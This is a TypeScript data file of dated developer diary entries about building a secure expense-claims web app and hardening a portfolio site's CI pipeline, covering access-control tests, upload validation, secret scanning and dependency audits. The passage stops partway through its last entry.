export interface DiaryLab {
  title: string
  notes: string[]
  solution: string
  /** Whether the lab was fully solved. Some blind/OAST labs are blocked behind Burp Pro. */
  status?: 'completed' | 'in-progress' | 'blocked'
  /** Reference screenshots, relative to src/assets, e.g. 'Burp/Lab10.webp' */
  screenshots?: string[]
  /** Path to an accompanying automation script, relative to src/assets, e.g. 'LabScripts/sqli_solver.py' */
  script?: string
}

export interface DiaryEntry {
  id: string
  /** ISO date string, e.g. '2026-07-28'. Used for sorting. */
  date: string
  /** Project this entry belongs to, used for filtering (e.g. 'AppSec Homelab'). */
  category: string
  title: string
  /** What you actually did that day. */
  workedOn: string[]
  /** Intro or reflection before lab breakdown. */
  body: string[]
  /** Per-lab write-ups with solutions. */
  labs?: DiaryLab[]
  /** Before/after (or standalone) code snippets, rendered as labelled code blocks after `body`. */
  codeSnippets?: { label: string; code: string }[]
  tools?: string[]
  tags?: string[]
  /** External references, rendered as a list at the end. */
  links?: { label: string; url: string }[]
  milestone?: boolean
  /** Paths relative to src/assets, e.g. 'Homelab/HomeLab3.webp'. */
  screenshots?: string[]
}

/**
 * Add new posts at the top of this array (newest first).
 * Keep dates as YYYY-MM-DD so sorting stays correct.
 */
export const cyberDiaryEntries: DiaryEntry[] = [
  {
    id: 'secure-expense-claims-entry-18-receipt-uploads-frontend',
    date: '2026-10-07',
    category: 'Secure Expense Claims',
    title: 'Receipts in the browser, and a header I nearly broke',
    workedOn: [
      'Added receipt upload and download to the claim tables',
      'Added a render test that checks which sections each user sees',
    ],
    body: [
      "Receipts can now be uploaded and downloaded from the claim tables. Uploads only show on drafts, matching the API, and managers and finance get download links in their queues. The non-obvious part was the request function. It added a JSON content type to every request, which would have replaced the multipart header the browser builds for a file upload, boundary and all, and the API couldn't have read the file. It now only sets JSON when the body is a string, and a test fails if that changes.",
      "Downloads can't be plain links, because a link can't send the sign-in headers. The page fetches the file, wraps it in a temporary blob URL and saves it under the name the API chose, receipt-<id>.pdf, never the uploader's name. In the browser I uploaded a real PDF, then an HTML file renamed to .pdf, which showed 415 Unsupported Media Type on the row. Through the dev proxy, a 6 MB file came back 413. The accept attribute on the file picker only filters the dialog. The magic byte check in the API is what stops a disguised file.",
      "I also added the render test I'd wanted since the payments page. It renders the app as each seeded user and checks which sections appear, and with the My claims line removed it failed for Alice, Manny and Fiona. Review still mattered: my edit dropped the line that passes a caller's own headers through the request function. Nothing passes headers yet, so every test passed, but the first Entra ID token in Phase 3 would have vanished without an error.",
      'When a test suite passes, ask what it never exercises. A line nothing calls yet can be deleted without a single failure.',
    ],
    tools: ['React', 'TypeScript', 'Vitest', 'Testing Library', 'jsdom'],
    tags: ['Secure Expense Claims', 'frontend', 'file upload', 'testing'],
    screenshots: ['SecureExpenseClaims/SEC32.webp'],
  },
  {
    id: 'secure-expense-claims-entry-17-payments-page',
    date: '2026-10-07',
    category: 'Secure Expense Claims',
    title: 'A page that vanished with every check green',
    workedOn: [
      'Added the payments page for finance using a shared claim queue component',
      'Showed the API refuses a payment the UI never offers',
    ],
    body: [
      "Finance now has a page of approved claims waiting for payment. It was nearly identical to the approvals page, so instead of copying it I turned the approvals page into one shared queue component. Each page passes a title, the list endpoint and its actions, and each action posts to the matching claim route. I tested the whole path in the browser: Alice submitted a claim, Manny approved it, Fiona paid it, and Alice's list showed it as Paid.",
      "When I typed it into the repo, the edit to the main app file deleted the My claims page entirely. Lint passed, the TypeScript build passed and the tests passed, because the page still compiled even though nothing used it. Comparing the file against the version I'd tested in the browser is what caught it. Nobody could have added a claim if it had merged.",
      "I also tried to pay one of Alice's approved claims as Alice, with curl and her development headers. The UI never shows her a Pay button, and the API returned 403 because the finance role check runs before any code. That's 403 and not 404 on purpose: it's a role check, not a question of whether the claim exists.",
      "A green build only proves what the checks look at. If nothing renders the page, nothing notices when it's gone.",
    ],
    tools: ['React', 'TypeScript', 'curl'],
    tags: ['Secure Expense Claims', 'frontend', 'access control'],
    screenshots: [
      'SecureExpenseClaims/SEC30.webp',
      'SecureExpenseClaims/SEC31.webp',
    ],
  },
  {
    id: 'secure-expense-claims-entry-16-approvals-page',
    date: '2026-10-07',
    category: 'Secure Expense Claims',
    title: 'Approvals, and a 409 that explains itself',
    workedOn: [
      'Added the approvals page for managers',
      'Gave the no-manager submit error a message',
    ],
    body: [
      "Managers now have a page of submitted claims from their direct reports, with Approve and Reject buttons. The page has no rules of its own. Which claims appear, and who can decide them, is still worked out by the API's query, so hiding the page from other roles is a convenience and not a control.",
      "Submitting a claim with no manager used to return an empty 409 Conflict, the same response as submitting a claim that wasn't a draft. Those are different problems: one means the claim has moved on, the other is something an admin has to fix. I split the check so the no-manager case returns a problem detail telling the user to ask an admin. I extended the existing test to look for the message and checked it failed when the endpoint went back to a bare 409.",
      "Two errors that need different fixes shouldn't share one response.",
    ],
    tools: ['ASP.NET Core', 'React', 'TypeScript', 'xUnit'],
    tags: ['Secure Expense Claims', 'frontend', 'error handling'],
    screenshots: [
      'SecureExpenseClaims/SEC27.webp',
      'SecureExpenseClaims/SEC28.webp',
      'SecureExpenseClaims/SEC29.webp',
    ],
  },
  {
    id: 'secure-expense-claims-entry-15-frontend-my-claims',
    date: '2026-10-07',
    category: 'Secure Expense Claims',
    title: 'The first page, and a lint warning that was right',
    workedOn: [
      'Built the frontend shell with a development sign-in picker and the My claims page',
      'Added Vitest and made the frontend tests part of CI',
    ],
    body: [
      "The frontend now has its first real page. A development-only picker lets me sign in as Alice, Manny, Fiona or Adam, the seeded users from the API, and My claims lists, adds, edits and submits claims. The Vite dev server forwards anything under /api to the .NET API, so the browser only ever calls its own origin and I didn't have to open up CORS. Every request goes through one function that adds the sign-in headers, which is where the Entra ID token will go in Phase 3.",
      'I tested it in the browser against the real API. As Alice I added a claim, changed its amount and submitted it, and its edit buttons disappeared. As Manny, who has no manager, submitting showed 409: Conflict and the claim stayed a draft. The picker only changes which headers are sent. What each person can see is still decided by the API, which is why Manny only saw his own claims.',
      "The first version silenced two React lint warnings with a comment. They were pointing at a real race: if I switched user while the list was loading, the previous user's response could arrive late and replace the new one. The page now ignores responses for a user who is no longer selected. Vitest covers the request function: the headers it sends, the /api prefix, turning error responses into errors with a status, and empty 204 responses. CI runs those tests on every PR.",
      'Before silencing a warning, check what it is pointing at.',
    ],
    tools: ['React', 'TypeScript', 'Vite', 'Vitest'],
    tags: ['Secure Expense Claims', 'frontend', 'testing', 'CI/CD pipeline'],
    screenshots: [
      'SecureExpenseClaims/SEC25.webp',
      'SecureExpenseClaims/SEC26.webp',
    ],
  },
  {
    id: 'secure-expense-claims-entry-14-admin-and-seed',
    date: '2026-10-07',
    category: 'Secure Expense Claims',
    title: 'An admin who can move people but not money',
    workedOn: [
      'Added admin endpoints to list users, change reporting lines and read the audit log',
      'Added four Development-only seed users, one per role',
    ],
    body: [
      "Checking the plan against what I'd built, I found the Admin role had no API at all, and Phase 1 isn't done until every role works. An admin can list users, change someone's manager and read the audit log. The user list leaves out bank details, because admins manage people, not payments. The Admin role has no approve or pay permissions, and a test proves an admin calling approve gets a 403.",
      "Changing a manager decides who can approve someone's money, so it writes its own audit row with who made the change and the old and new manager. A test changes an employee's manager, then checks the old manager now gets a 404 on that employee's claim while the new manager can approve it. When I stopped auditing the change, the test failed, and the same happened when I allowed someone to be their own manager.",
      'In Development, the app now applies its migrations and adds four test users at startup: Alice, Manny, Fiona and Adam. The seed is code that only runs locally, not migration data, which would also have run in production. That broke the error-handling test, which points the database at a dead port on purpose, so the startup work can be switched off for that one test. My own mistake was writing "Set Manager" with a space while every other audit action is one word. The test caught it, and later detections will search for those names exactly.',
      'Every way of changing who can approve money needs the same audit trail as approving it.',
    ],
    tools: ['ASP.NET Core', 'EF Core', 'xUnit'],
    tags: [
      'Secure Expense Claims',
      'access control',
      'separation of duties',
      'audit logging',
    ],
    screenshots: [
      'SecureExpenseClaims/SEC23.webp',
      'SecureExpenseClaims/SEC24.webp',
    ],
  },
  {
    id: 'secure-expense-claims-entry-13-errors-and-rate-limits',
    date: '2026-10-07',
    category: 'Secure Expense Claims',
    title: 'Errors that say nothing useful to an attacker',
    workedOn: [
      'Replaced stack traces in error responses with a generic problem and a trace ID',
      'Added a per-user rate limit of 100 requests a minute',
    ],
    body: [
      "Before changing anything, I forced a real failure by pointing the API at a database port where nothing was listening. The response was plain text containing the Npgsql exception and its stack trace, which is .NET's developer exception page and on by default in Development. Now every error comes back as a problem-details response with a status, a generic title and a trace ID, in every environment, so what I test against is what production sends. The stack trace still goes to the server log, and the trace ID links the two.",
      "The first version turned a 400 into a 500. In Development, ASP.NET reports a malformed request body by throwing an exception, and my handler caught that like any other error. The mass-assignment test from earlier failed, which is how I found it. The handler now keeps the original status for bad requests, so a client's mistake isn't reported as a server error.",
      'Rate limiting gives each signed-in user their own budget of 100 requests a minute, and anonymous callers are counted by IP address. Health checks are exempt, because the platform calls them constantly. The test lowers the limit to 3: the fourth request gets a 429 while a second user still gets through. With the limiter removed the test failed, and with one shared budget for everyone the second user was blocked too, so the test caught both.',
      "An error handler needs the same testing as any other control, because a handler that catches everything also catches errors that were never the server's fault.",
    ],
    tools: ['ASP.NET Core', 'xUnit', 'Testcontainers'],
    tags: [
      'Secure Expense Claims',
      'error handling',
      'rate limiting',
      'testing',
    ],
    screenshots: [
      'SecureExpenseClaims/SEC22.webp',
      'SecureExpenseClaims/SEC21.webp',
    ],
  },
  {
    id: 'secure-expense-claims-entry-12-receipt-uploads',
    date: '2026-10-07',
    category: 'Secure Expense Claims',
    title: 'Receipt uploads checked by content, not by name',
    workedOn: [
      'Added receipt uploads to Blob Storage, with Azurite running locally and in tests',
      'Checked file types by their first bytes, capped uploads at 5 MB and served downloads only to people who can see the claim',
    ],
    body: [
      "Receipts are the first part of the app where users send files, so they get their own checks. The API reads the first bytes of each upload and only accepts PDF, PNG or JPEG signatures. The uploader chooses both the file name and the Content-Type header, so the API ignores them. When I sent a text file named fake.pdf as application/pdf, it came back as a 415. The server stores each file under a name it generates from the receipt's ID, and downloads come back as attachments with a name the server chooses, so an uploaded file is never shown inside the app.",
      'Who can download a receipt follows the same rules as the claim: the owner, their manager, and finance once the claim is approved. Everyone else gets a 404. I reused the manager and finance queries from the approval workflow rather than writing the rules again. I capped uploads at 5 MB in two places. The real web server stops reading the request past the limit, which I checked with a 6 MB upload that came back as a 413. The test server ignores that limit, so the code checks the file size as well.',
      'Azurite, the local Blob Storage emulator, rejected the SDK because the SDK uses a newer storage API version than Azurite knows about, so Azurite runs with --skipApiVersionCheck. The old health and sign-in tests started failing once the app needed Blob Storage at startup, so every test now starts Postgres and Azurite. My own mistakes were a misspelled method name and a connection string I nested inside the Logging section. All 42 tests passed with that mistake, because the test setup provides its own connection string, and the app only crashed when I ran it myself.',
      "Passing tests only say something about the configuration they use, and local settings files weren't part of it.",
    ],
    tools: [
      'ASP.NET Core',
      'Azure Blob Storage',
      'Azurite',
      'Testcontainers',
      'xUnit',
    ],
    tags: [
      'Secure Expense Claims',
      'file upload security',
      'access control',
      'testing',
    ],
    screenshots: [
      'SecureExpenseClaims/SEC19.webp',
      'SecureExpenseClaims/SEC20.webp',
      'SecureExpenseClaims/SEC18.webp',
    ],
  },
  {
    id: 'secure-expense-claims-entry-11-approval-workflow',
    date: '2026-10-06',
    category: 'Secure Expense Claims',
    title: 'Approvals that can only come from the right manager',
    workedOn: [
      'Added submit, approve, reject and pay, with an audit row for every change',
      'Tested the manager, self-approval and finance rules, allowed and denied',
    ],
    body: [
      "Claims can now move through the whole workflow: an employee submits, their manager approves or rejects, and finance pays. Each rule sits in the query that loads the claim. A manager only finds claims from their own direct reports, which is a join to the Users table, and never their own. Finance only finds approved or paid claims, and never their own. If you can't act on a claim, the query doesn't load it and you get a 404.",
      'Separation of duties needed its own check. "Is this my direct report?" and "is this my own claim?" are different questions, and the second only matters when someone is recorded as their own manager. I wrote a test with that data, then removed the "not my own claim" condition to check the test would catch it. It failed. Removing the manager relationship failed the cross-team and approvals-list tests the same way.',
      'Every status change writes an audit row with who did it, taken from the signed-in identity, and the old and new status. The row and the status change go in the same SaveChanges call, which EF runs as one database transaction, so an approval can\'t exist without its record. A test that runs submit, approve and pay checks the audit trail reads Submit, Approve, Pay. My own mistakes were typing again: the synchronous query method where I needed the async one, a misnamed parameter, and "Submitted" instead of "Submit", which would have broken those audit tests.',
      'Separation of duties needs a test with data that should never exist, because that data is the case the rule is for.',
    ],
    tools: ['ASP.NET Core', 'EF Core', 'xUnit', 'Testcontainers'],
    tags: [
      'Secure Expense Claims',
      'access control',
      'separation of duties',
      'audit logging',
      'testing',
    ],
    screenshots: ['SecureExpenseClaims/SEC17.webp'],
  },
  {
    id: 'secure-expense-claims-entry-10-employee-claims',
    date: '2026-10-06',
    category: 'Secure Expense Claims',
    title: 'Claims only their owner can see',
    workedOn: [
      'Added endpoints for employees to create, list, read and edit their own claims',
      'Tested every ownership and validation rule, allowed and denied',
    ],
    body: [
      "The first real features are for employees: they can create a claim, list their own claims, read one, and edit it while it's still a draft. The ownership check sits inside the database query, which only returns a claim if its ID and owner both match. Someone else's claim returns 404, the same as a claim that doesn't exist, so changing the ID in the URL reveals nothing.",
      'Requests use their own small types with only the fields a caller may set, never the database entity, so a caller can\'t set status or owner by adding them to the JSON. The API rejects unknown fields with a 400 instead of ignoring them, so a request with "status":"Approved" fails visibly. .NET 10\'s built-in validation checks the amount range before my code runs, and the database constraint from earlier is still behind it.',
      "There are 12 new tests, one for each allowed and denied case: reading and editing another person's claim, listing, mass assignment, editing a submitted claim, out-of-range amounts, the wrong role, an unknown user and no sign-in. I checked they could fail by removing the owner check from the query, which failed the two cross-user tests, and by allowing unknown JSON fields, which failed the mass-assignment test.",
      'If the authorization rule lives in the query that fetches the data, nobody can skip it by forgetting a separate check afterwards.',
    ],
    tools: ['ASP.NET Core', 'EF Core', 'xUnit', 'Testcontainers'],
    tags: [
      'Secure Expense Claims',
      'access control',
      'IDOR',
      'mass assignment',
      'testing',
    ],
    screenshots: [
      'SecureExpenseClaims/SEC15.webp',
      'SecureExpenseClaims/SEC16.webp',
      'SecureExpenseClaims/SEC14.webp',
    ],
  },
  {
    id: 'secure-expense-claims-entry-9-dev-sign-in',
    date: '2026-10-06',
    category: 'Secure Expense Claims',
    title: 'A sign-in that must never reach production',
    workedOn: [
      'Added a Development-only sign-in for testing roles locally',
      'Added a test proving it is ignored in Production',
    ],
    body: [
      "Until Entra ID arrives, I need to act as an employee, a manager or finance locally. I added a stub sign-in that trusts two request headers, one for a user ID and one for roles. It's also the most dangerous code in the project: if it ever ran in Azure, anyone could become an admin with one header. My threat model lists it as S2.",
      'The app only registers the stub in Development. Every other environment registers JWT bearer authentication with nothing configured yet, so it rejects every request with a 401 until Entra ID is set up. With no scheme at all, the authorization check would throw an exception and return a 500 instead.',
      'A test runs the app as Production and sends an admin header, and expects a 401. To make sure the test could catch the mistake, I changed the condition to true so the app registered the stub everywhere. That test failed and the other five passed. I also lost the Development-only OpenAPI endpoint while editing Program.cs, which no test covered, and only noticed by reading the diff.',
      'A shortcut for testing needs its own test proving it is off in production.',
    ],
    tools: ['ASP.NET Core', 'xUnit'],
    tags: ['Secure Expense Claims', 'authentication', 'testing'],
    screenshots: [
      'SecureExpenseClaims/SEC13.webp',
      'SecureExpenseClaims/SEC12.webp',
    ],
  },
  {
    id: 'secure-expense-claims-entry-8-postgres-integration-tests',
    date: '2026-10-06',
    category: 'Secure Expense Claims',
    title: 'Testing against the real database',
    workedOn: [
      'Added integration tests that run against a throwaway Postgres 18 container',
      'Added a CI check that fails if the model changes without a migration',
    ],
    body: [
      "The database rules from the last step only counted if something tested them, so I added integration tests that run against real Postgres. Testcontainers starts a Postgres 18 container for the test run, the API points at it instead of my local database, and the test setup applies the real migrations before any test runs. An in-memory database would have been quicker, but it ignores check constraints and has no xmin column, so it can't test the two rules I most wanted to prove.",
      "One test inserts a claim with an amount of -5 and expects the database to refuse it. The other simulates two people loading the same claim: the first saves a change, and the second save has to fail with a concurrency error instead of overwriting it. Both pass on my Mac and in CI, where GitHub's runners have Docker.",
      'I also added dotnet ef migrations has-pending-model-changes to the API job. It compares the C# model with the last migration and fails if they differ, so a model change can\'t merge without its migration. Before relying on it, I added a property without a migration and ran it: exit code 1 and "Changes have been made to the model since the last migration". On the real model it exits 0.',
      'A test double that skips the rules you care about can only prove the code around them.',
    ],
    tools: [
      'Testcontainers',
      'xUnit',
      'EF Core',
      'PostgreSQL',
      'GitHub Actions',
    ],
    tags: ['Secure Expense Claims', 'testing', 'database', 'CI/CD pipeline'],
    screenshots: [
      'SecureExpenseClaims/SEC11.webp',
      'SecureExpenseClaims/SEC10.webp',
    ],
  },
  {
    id: 'secure-expense-claims-entry-7-data-model',
    date: '2026-10-05',
    category: 'Secure Expense Claims',
    title: 'Putting the money rules in the database',
    workedOn: [
      'Designed the users, claims and audit tables and generated the first EF Core migration',
      'Tested the amount constraint and the concurrency column against Postgres',
    ],
    body: [
      "I added the first three tables: users with their manager and bank details, claims, and an append-only audit log. Roles aren't in the database, because they'll come from Entra ID. Amounts are numeric(12,2), because a floating-point type can't represent money exactly. Statuses are stored as text, so the audit log reads \"Approved\" rather than 2. IDs are version 7 GUIDs, which can't be guessed but still sort by creation time, so the indexes stay compact.",
      "Two rules live in the database itself rather than only in the API. A check constraint rejects any claim with an amount of zero or less, and when I inserted -5 by hand, Postgres refused it. Each claim also carries a version number from Postgres's xmin system column, so if a manager approves a claim while the employee is editing it, the second save fails instead of overwriting the first. The generated migration listed xmin as a column to create, which Postgres would reject. I applied it to see, and Npgsql skipped it as it should.",
      'Most of my mistakes were typing. Autocomplete turned uint into AvxVnniInt16, a CPU vector type, and added the using line for it. That compiled, so I only caught it by reading the diff. I also misspelled two property names, which the build did catch.',
      'A rule the database enforces still holds when a bug or a hand-written query skips the application.',
    ],
    tools: ['EF Core', 'PostgreSQL', '.NET 10'],
    tags: ['Secure Expense Claims', 'database', 'data integrity'],
    screenshots: ['SecureExpenseClaims/SEC9.webp'],
  },
  {
    id: 'portfolio-site-entry-4-live-site-check',
    date: '2026-10-03',
    category: 'Portfolio Site',
    title: 'Checking the live site after every deploy',
    workedOn: [
      'Checked which security headers GitHub Pages actually sends, and found none',
      'Wrote a script that checks the HTTP to HTTPS redirect and the CSP meta tag on the live site',
      'Added it as a CI job that runs after each deploy',
    ],
    body: [
      "I planned to check the site's security headers after each deploy, so I looked at what GitHub Pages sends first. There was no HSTS, no X-Content-Type-Options and no frame-ancestors, and Pages doesn't let you set any of them. So the check covers what I do control: http:// has to return a 301 to https://, and the HTML has to contain the CSP meta tag my build adds. The script requests the page with the commit SHA in the query string so the CDN's 10-minute cache can't hand back the previous build.",
      'Before relying on it I made it fail. Against charlesgoodsir.com it printed two oks, and against example.com, which serves plain HTTP, it failed with a 200 where it expected a 301. It runs in CI after the deploy job, so it is skipped on PRs the same way the deploy is.',
      "While editing I pasted a line of the script into the end of ci.yml by mistake. actionlint caught it before I committed. GitHub would have rejected the workflow, and CI wouldn't have run at all.",
      "A check is only useful for what it can see. The headers Pages can't send are written down as a known gap rather than left out.",
    ],
    tools: ['GitHub Actions', 'curl', 'Bash', 'actionlint', 'ShellCheck'],
    tags: [
      'Portfolio Site',
      'CI/CD pipeline',
      'Content Security Policy',
      'HTTPS',
    ],
    screenshots: ['PortfolioSite/PS3.webp'],
  },
  {
    id: 'portfolio-site-entry-3-deploy-on-merge-audit-gate',
    date: '2026-10-03',
    category: 'Portfolio Site',
    title: 'Deploying on merge, and an audit gate that went red on its own',
    workedOn: [
      'Added a Prettier check to CI, and fixed the one tracked file it flagged',
      'Replaced the manual npm run deploy with a GitHub Pages deploy job that only runs on main, after every check passes',
      'Hit a new high-severity advisory in braces, pulled in only by gh-pages',
      'Removed gh-pages instead of running npm audit fix --force',
    ],
    body: [
      'Until now the site went live when I ran npm run deploy from my laptop. CI checked every PR, but nothing stopped me deploying a build that had never passed it. I added a deploy job to the same workflow. On a push to main the check job uploads the dist folder it already built, and the deploy job only runs once both the checks and the secret scan pass. Only that job gets permission to write to Pages, so the jobs that run PR code never can. The github-pages environment also only accepts deploys from main, so GitHub enforces the rule as well as my YAML. Before that I added a Prettier check to CI. It flagged a trailing comma in my tracked VS Code settings, so I fixed that in the same commit.',
      "The PR went red, but not because of anything I'd changed. npm audit failed on a new high-severity advisory in braces, a denial of service through deeply nested patterns. I traced it with npm ls: gh-pages, then globby, fast-glob and micromatch, then braces. The suggested fix was npm audit fix --force, which would have downgraded gh-pages to an older version, a breaking change to a tool this PR was replacing anyway.",
      'So I removed gh-pages and its deploy scripts, and the audit came back with 0 vulnerabilities. There is no manual deploy left. If the workflow breaks, I fix the workflow. I kept the old gh-pages branch, so I can point Pages back at it if the new deploy fails. After the merge, the run on main went green: checks, secret scan, then the deploy, and the new build was live. Then I removed gh-pages from the branches the github-pages environment accepts, so main is the only branch that can deploy.',
      'The quickest way to fix a vulnerable dependency can be to remove it. Check whether you still need it before forcing an upgrade.',
    ],
    tools: ['GitHub Actions', 'GitHub Pages', 'npm audit', 'Prettier'],
    tags: [
      'Portfolio Site',
      'CI/CD pipeline',
      'supply chain',
      'continuous deployment',
    ],
    screenshots: ['PortfolioSite/PS1.webp', 'PortfolioSite/PS2.webp'],
  },
  {
    id: 'secure-expense-claims-entry-6-postgres-health-checks',
    date: '2026-10-02',
    category: 'Secure Expense Claims',
    title:
      'Postgres locally, and a health check that failed for the right reason',
    workedOn: [
      'Added Postgres 18 in Docker Compose and connected the API with EF Core',
      'Split health checks into liveness and readiness',
    ],
    body: [
      "Phase 1 started with the database. Postgres 18 runs in Docker Compose, the newest version Azure's Flexible Server supports, so local and Azure will match. The port is published on 127.0.0.1 only. A plain 5432:5432 would expose it to my whole network, and I found out on the homelab that Docker's published ports skip the host firewall. The password lives in a gitignored .env file, and Compose refuses to start without it. The API's connection string is in .NET user-secrets, outside the repo. In Azure there will be no password at all, because the app will sign in with a managed identity.",
      "I split the health endpoint in two. /health only says the process is running, and /health/ready also opens a database connection. In Azure, the platform restarts containers that fail liveness and stops sending traffic to ones that fail readiness, and a database outage shouldn't cause restarts. It also keeps CI simple, because the existing test only calls /health and never needs a database.",
      'The first readiness check returned 503 while the database was running and healthy. The Postgres log showed password authentication failing at the same second as my request. I had pasted the connection string command with the placeholder text still in it, so the user-secret said "<your .env password>". After fixing it, readiness returned 200, and stopping the database turned it back to 503 while liveness stayed at 200.',
      "An error I wasn't expecting still told me the check worked, because it failed on the exact thing it was there to check.",
    ],
    tools: [
      'PostgreSQL',
      'Docker Compose',
      'EF Core',
      'ASP.NET Core',
      '.NET user-secrets',
    ],
    tags: [
      'Secure Expense Claims',
      'database',
      'health checks',
      'secrets management',
    ],
    screenshots: [
      'SecureExpenseClaims/SEC7.webp',
      'SecureExpenseClaims/SEC8.webp',
    ],
  },
  {
    id: 'secure-expense-claims-entry-5-gitleaks-proof-phase-0',
    date: '2026-10-02',
    category: 'Secure Expense Claims',
    milestone: true,
    title: 'Trying to merge a fake secret',
    workedOn: [
      'Opened a PR with a fake API key to prove the secret scan blocks it',
      'Finished Phase 0: threat model, CI and required checks',
    ],
    body: [
      "The last test for Phase 0 was to try to merge a secret. I committed a config.txt with a made-up api_key value on a test branch. I picked a generic key rather than an AWS-shaped one, because gitleaks skips AWS keys ending in EXAMPLE, and GitHub's own push protection might have blocked an AWS key before CI saw it, which would have tested a different control. Before pushing, I ran gitleaks on the same commits locally, so I knew CI would see it.",
      "On the PR, the secret scan failed with one finding, rule generic-api-key in config.txt, with the value redacted in the log. The other five checks passed, and the ruleset blocked the merge. I closed the PR without merging and deleted the branch. The fake value is still in the closed PR's history, which is why it had to be something that was never real.",
      "That finishes Phase 0. There's a STRIDE threat model with 24 threats written before any code, and every PR to main has to pass six checks. Each check has been seen failing on something real or something I planted, so none of them is assumed to work.",
      "A check I haven't seen fail could be broken without my knowing.",
    ],
    tools: ['gitleaks', 'GitHub Actions', 'GitHub rulesets'],
    tags: [
      'Secure Expense Claims',
      'secret scanning',
      'branch protection',
      'CI/CD pipeline',
    ],
    screenshots: [
      'SecureExpenseClaims/SEC5.webp',
      'SecureExpenseClaims/SEC6.webp',
    ],
  },
  {
    id: 'secure-expense-claims-entry-4-actionlint',
    date: '2026-10-02',
    category: 'Secure Expense Claims',
    title: 'Linting the workflows themselves',
    workedOn: [
      'Added actionlint to CI and made it a required check',
      'Proved it catches a broken workflow before relying on it',
    ],
    body: [
      "Prettier formats my YAML on save, but it only checks that the file is valid YAML, not that it's a valid workflow. A job with a misspelled key is still valid YAML, so GitHub would only complain when it tried to run it. I added actionlint as a sixth CI job. It checks workflow keys, expressions and if: conditions, and runs shellcheck over every run: block. I install it the same way as Trivy: download the release and its checksum file and check the hash before using it.",
      'Before trusting it, I made a copy of ci.yml with runs-on changed to run-on in every job and ran actionlint on it. It reported 12 errors, two for each of the six jobs, and exited with 1. The real workflows came back clean. Once it had run on its own PR, I added Workflow lint to the required checks on main, so there are now six.',
      'Every file type needs its own check. A file can be well formatted and still be wrong for the tool that reads it.',
    ],
    tools: ['actionlint', 'shellcheck', 'GitHub Actions', 'GitHub rulesets'],
    tags: ['Secure Expense Claims', 'CI/CD pipeline', 'branch protection'],
  },
  {
    id: 'secure-expense-claims-entry-3-auto-merge-required-checks',
    date: '2026-10-02',
    category: 'Secure Expense Claims',
    title: "An auto-merge that didn't wait for CI",
    workedOn: [
      'Added Dependabot with auto-merge for minor and patch updates',
      'Made the CI checks required on main and sorted the major updates by hand',
    ],
    body: [
      'I added Dependabot for NuGet, npm and GitHub Actions, with a workflow that turns on auto-merge for minor and patch updates and leaves major ones for me. I knew that until the ruleset on main required status checks, "merge once checks pass" would mean merge straight away. The first Dependabot PR showed it. A patch update to the xunit runner merged one second after the secret scan finished, while the other four checks were still running. They all passed afterwards, so nothing bad got in, but a failing check wouldn\'t have stopped it.',
      "I added the five CI jobs to the ruleset as required checks, tied to the GitHub Actions app so a status with the same name from somewhere else doesn't count. Branches also have to be up to date with main before they merge. Later I committed a .gitignore change straight to my local main and tried to push it, and GitHub rejected it. I moved the commit to a branch and opened a PR.",
      "Five major updates were left for me. I merged the test SDK, coverlet and the xunit runner one at a time, letting Dependabot rebase the rest in between. TypeScript 7 passed CI because this project uses oxlint rather than typescript-eslint. I closed the @types/node 26 update, because the types should match Node 24, which is what the project runs, and added an ignore rule so it doesn't come back.",
      'An automation setting depends on the rules around it. Auto-merge was set up correctly and still merged before CI finished, because the ruleset gave it nothing to wait for.',
    ],
    tools: ['Dependabot', 'GitHub Actions', 'GitHub rulesets'],
    tags: [
      'Secure Expense Claims',
      'Dependabot',
      'branch protection',
      'supply chain',
    ],
    screenshots: [
      'SecureExpenseClaims/SEC3.webp',
      'SecureExpenseClaims/SEC4.webp',
    ],
  },
  {
    id: 'secure-expense-claims-entry-2-ci-first-findings',
    date: '2026-10-02',
    category: 'Secure Expense Claims',
    title: 'CI on every PR, and what it found on the first run',
    workedOn: [
      'Added CI: build and test, lint and npm audit, gitleaks, Semgrep and Trivy on both images',
      'Fixed two image findings and accepted a third with an expiry date',
    ],
    body: [
      "Every PR now runs five checks: the API build and tests, the frontend lint, build and npm audit, gitleaks, Semgrep, and Trivy on both container images. I install Trivy by downloading the binary and its checksum file and checking the hash before running it. I stopped using the trivy-action wrapper after finding that my homelab pins it to a commit that doesn't exist in the action's repository. The plan said to run dotnet list package --vulnerable, but that command exits 0 even when it finds something. NuGet already audits on every restore, so I made high and critical advisories into errors. When I added System.Text.Json 8.0.4 as a test, the restore failed with NU1903.",
      "The first run failed on three findings. Semgrep flagged the API Dockerfile for having no USER line. The chiseled .NET image already runs as user 1654, but Semgrep can't see what the base image sets, so I added USER $APP_UID to make it explicit. Trivy found a HIGH pcre2 CVE in the nginx image, which an apk upgrade in the Dockerfile fixed. It also found a HIGH OpenSSL CVE in the .NET image. Ubuntu has released the fix, but Microsoft hasn't rebuilt the chiseled image yet, and that image has no package manager to upgrade it with. I accepted that one with a written reason and an expiry date of 16 October, so the build goes red again if the image still hasn't been rebuilt.",
      'The mistakes along the way were mine and mostly about where files go. I put the workflow in github/ without the dot, then put dependabot.yml inside the workflows folder. Neither would have run, and nothing would have told me. I named the ignore file .yml while the workflow pointed at .yaml. I also left out the final newline three times, which is why I set up Prettier to format on save.',
      "A misplaced config file doesn't fail. It just never runs, so the only way to know a check works is to see it fail on something real.",
    ],
    codeSnippets: [
      {
        label: 'Directory.Build.props: NuGet audit fails the restore',
        code: `<NuGetAuditMode>all</NuGetAuditMode>
<NuGetAuditLevel>high</NuGetAuditLevel>
<WarningsAsErrors>$(WarningsAsErrors);NU1903;NU1904</WarningsAsErrors>`,
      },
      {
        label: '.trivyignore.yaml: an accepted finding that expires',
        code: `vulnerabilities:
  - id: CVE-2026-84782
    statement: >-
      OpenSSL in the aspnet:10.0-noble-chiseled base image. Ubuntu has the fix
      (3.0.13-0ubuntu3.16) but Microsoft hasn't rebuilt the image yet, and
      chiseled images have no package manager to upgrade it. Recheck when this
      expires; drop it once the rebuilt image scans clean.
    expired_at: 2026-10-16`,
      },
    ],
    tools: [
      'GitHub Actions',
      'Trivy',
      'Semgrep',
      'gitleaks',
      'NuGet audit',
      'Prettier',
    ],
    tags: [
      'Secure Expense Claims',
      'CI/CD pipeline',
      'container security',
      'supply chain',
    ],
    screenshots: [
      'SecureExpenseClaims/SEC1.webp',
      'SecureExpenseClaims/SEC2.webp',
    ],
  },
  {
    id: 'secure-expense-claims-entry-1-threat-model-scaffold',
    date: '2026-10-01',
    category: 'Secure Expense Claims',
    title:
      'A threat model before any code, and a scaffold so CI has something real to check',
    workedOn: [
      'Started a new project that puts a real app on secure Azure infrastructure, then hardens, attacks and monitors it',
